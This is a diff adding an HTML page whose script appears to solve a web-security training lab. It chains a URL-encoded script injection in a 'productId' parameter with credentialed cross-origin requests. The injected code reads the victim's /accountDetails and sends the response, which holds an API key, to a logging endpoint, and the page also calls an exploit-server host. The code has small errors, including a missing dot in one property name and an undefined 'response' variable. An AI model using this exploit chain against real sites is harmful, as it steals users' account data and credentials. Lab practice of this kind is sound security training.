@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1>
+        Hello World!!
+    </h1>
+
+    <script>
+        let baseRequest = new XMLHttpRequest();
+        baseRequest.open("Get",
+            "http://stock.0a66001a0342867682807f4200c80000.web-security-academy.net/?productId=%3Cscript%3Elet+myRequest+%3d+new+XMLHttpRequest()%3bmyRequest.open(%22Get%22,%22https%3a//0a66001a0342867682807f4200c80000.web-security-academy.net/accountDetails%22,+true)%3bmyRequest.withCredentials+%3d+true%3bmyRequest.send(null)%3bmyRequest.onreadystatechange+%3d+function+()+{if+(this.readyState+%3d%3d+XMLHttpRequest.DONE)fetch(%22/log%3fkey%22+%2b+myRequest.responseText)}%3C/script%3E&storeId=2",
+            true);
+        baseRequest.withCredentials = true;
+        baseRequest.send(null);
+        baseRequest.onreadystatechange = function () {
+            if (this.readyState == XMLHttpRequest.DONE) {
+                let myRequest = new XMLHttpRequest();
+                myRequest.open("Get",
+                    "https://exploit-0a4f00fa030a861382717e6b018c00d9.exploit-server.net/", true);
+                myRequestwithCredentials = true;
+                myRequest.send(null);
+                myRequest.onreadystatechange = function () {
+                    if (this.readyState == XMLHttpRequest.DONE) fetch("/log?key=attackDOne")
+                }
+            }
+
+        }
+        console.log(response["apikey"])
+    </script>
+</body>
+
+</html>
